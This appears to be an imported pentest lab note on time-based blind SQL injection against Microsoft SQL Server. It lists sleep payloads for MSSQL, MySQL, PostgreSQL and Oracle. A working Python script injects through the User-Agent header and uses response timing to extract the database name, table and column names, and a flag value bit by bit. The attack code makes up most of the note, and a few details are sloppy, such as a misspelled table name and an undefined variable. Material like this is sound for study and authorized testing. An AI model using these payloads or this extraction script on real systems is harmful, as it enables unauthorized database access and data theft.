---
technique: "Time-based SQLi"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Time-based SQLi.md"
source_sha256: "469fdfa9291ccee95c0bbaeb34fbfff9f27acbbc90cb83545f09afa20fb6b260"
curator_version: 2
review_status: imported-unreviewed
---

# Time-based SQLi

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: python3.

## Quick index — payloads & commands in this note
- `sql: SELECT ... FROM ... WHERE ... = 'Mozilla Firefox...'; IF (<q>) WAITFOR DELAY '0:0:5'--'`
- `sql: # Base Query`
- `python: #!/usr/bin/python3`
- `python: # Dump a number`
- `python: python .\poc.py`
- `python: db_name_length = 8 # dumpNumber("LEN(DB_NAME())")`
- `bash: python .\poc.py`
- `python: SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft';`
- `python: num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tabes WHERE TABLE_CATALOG`
- `bash: python .\poc.py2`
- `bash: select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order`
- `python: for i in range(num_tables):`
- `bash: python .\poc.py4`
- `sql: -- Get the number of columns in the 'flag' table`
- `python: num_columns = dumpNumber("select count(column_name) from INFORMATION_SCHEMA.columns where `
- `bash: db_name = "digcraft"`

## Playbook (operator notes)

# Time-based SQLi

- [WAITFOR](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql?view=sql-server-ver16) is a keyword which `blocks` the SQL query until a specific time; here we specify a delay of `10 seconds`

## Payloads

Time-based injections are of course not specific to MSSQL, but the 
syntax does differ a little bit for each language, so here are some 
example payloads we can use for other DBMSs:

| Database | Payload |
| --- | --- |
| MSSQL | `WAITFOR DELAY '0:0:10'` |
| MySQL/MariaDB | `AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')` |
| PostgreSQL | `|| (SELECT 1 FROM PG_SLEEP(10))` |
| Oracle | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)` |

---

## **1. Oracle Design**

In this case, no results or SQL error messages are displayed from the injection in the `User-Agent` header. All we know is that the query `does not run synchronously` because the rest of the page waits for it to complete before being returned to us. To extract data in this situation, we can make the server evaluate queries and then wait for different amounts of time based on the outcome, so for example let's imagine we want to know if the query `q` is `true` or `false`. We can set the User-Agent so that a query similar to the following is executed. If `q` is `true`, then the server will wait `5 seconds` before responding, and if `q` is `false` the server will respond immediately.

```sql
SELECT ... FROM ... WHERE ... = 'Mozilla Firefox...'; IF (<q>) WAITFOR DELAY '0:0:5'--'
```

### **Practice**

```sql
# Base Query
(select substring(db_name(), 5, 1)) = 'a'
```

```python
#!/usr/bin/python3

import requests
import time
import sys

# Define the length of time (in seconds) the server should
# wait if `q` is `true`
DELAY = 1

# Evalutes `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        "http://10.129.204.113:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

# Verify that the oracle works by checking if the correct
# values are returned for queries `1=1` and `1=0`
assert oracle("1=1")
assert not oracle("1=0")

def getDBLen():
    # Find Password length
    length = 0

    # Loop until the value of `length` matches `LEN(password)`
    while not oracle(f"LEN(db_name())={length}"):
        length += 1
    print(f"[*] DB length = {length}")
    return length

def getDBName(pwLength):
    # Dump the target's password
    remaining = pwLength
    print("[*] DB_NAME = ", end='')
    # Loop through all character indices in the password. SQL starts with 1, not 0
    for i in range(1, pwLength + 1):
       # Loop through all decimal values for printable ASCII characters (0x20-0x7E)
       for c in range(32,127):
            if oracle(f"ASCII(SUBSTRING(db_name(),{i},1))={c}"):
                print(chr(c), end='')
                sys.stdout.flush()
    print()
    
getDBName(getDBLen())

# Output:
# [*] DB length = 8
# [*] DB_NAME = digcraft
```

---

## 2. **Data Extraction**

### **Enumerating Database Name**

In the example of `Aunt Maria's Donuts`, we went straight to dumping out `maria's` password. However, this involved guessing the name of the password  column and assuming we were selecting from the users table. In this case, we don't know anything about the query being run except that it involves the `User-Agent`.

Therefore, we want to enumerate the databases/tables/columns first and then look at what could be worth dumping. The first thing we want to do is dump out the `name` of the `database` we are in. Let's expand the script with the following function which will allow us to dump the value of a `number` (less than 256) and then call it to get the value of `LEN(DB_NAME())`.

```python
# Dump a number
def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

db_name_length = dumpNumber("LEN(DB_NAME())")
print(db_name_length)
```

```python
python .\poc.py
8
```

Knowing the length of `DB_NAME()` we can dump the string value. Make sure to replace the call to `dumpLength` with the value so we don't run it again.

```python
db_name_length = 8 # dumpNumber("LEN(DB_NAME())")
# print(db_name_length)

# Dump a string
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

db_name = dumpString("DB_NAME()", db_name_length)
print(db_name)
```

```bash
python .\poc.py
digcraft
```

### **Enumerating Table Names**

```python
SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft';
```

```python
num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tabes WHERE TABLE_CATALOG='digcraft'")
print(num_tables)
```

```bash
python .\poc.py2
2
```

Let's get the length of each table, and then dump the name. This query will look pretty ugly because MSSQL doesn't have `OFFSET/LIMIT` like MySQL for example. Here we are dumping the `length` of one `table_name`, ordering the results by `table_name`, offset by 0 rows. We set the offset to `1` to dump the second table.

```bash
select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order by table_name offset 0 rows fetch next 1 rows only;
```

Let's add a loop to our script (don't forget to comment out other queries to save time). We'll dump the length of the `i^th` table's name and then their string value one after another.

```python
for i in range(num_tables):
    table_name_length = dumpNumber(f"select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only")
    print(table_name_length)
    table_name = dumpString(f"select table_name from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only", table_name_length)
    print(table_name)

```

```bash
python .\poc.py4
flag
10
userAgents
```

### **Enumerating Column Names**

```sql
-- Get the number of columns in the 'flag' table
select count(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft';

-- Get the length of the first column name in the 'flag' table
select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset 0 rows fetch next 1 rows only;

-- Get the value of the first column name in the 'flag' table
select column_name from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset 0 rows fetch next 1 rows only;
```

```python
num_columns = dumpNumber("select count(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft'")
print(num_columns)

for i in range(num_columns):
    column_name_length = dumpNumber(f"select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset {i} rows fetch next 1 rows only")
    print(column_name_length)
    column_name = dumpString(f"select column_name from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset {i} rows fetch next 1 rows only", column_name_length)
    print(column_name)
```

### Extracting the column content for table=’flag’ column=’flag’

---

⚠️ **DBO** ⚠️

**SQL Server** the full name of an object follows the **4-part naming convention**:

`server_name.database_name.schema_name.object_name`

When you write:

`digcraft.flag`

SQL Server interprets this as:

- `digcraft` = database
- `flag` = **schema** (not table!)

…and then it expects an **object name** after the schema. Since you didn’t provide it, the query fails.

---

```bash
db_name = "digcraft"
db_table = "flag"
db_column = "flag"

flag_length = f"SELECT LEN({db_column}) FROM {db_name}.dbo.{db_table}" 

# Output: 37
print(dumpNumber(flag_length))

# Dump the contents
print(dumpString(f"SELECT {db_column} FROM {db_name}.dbo.{db_table}", flagLen))
```

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/Time-based SQLi.md`
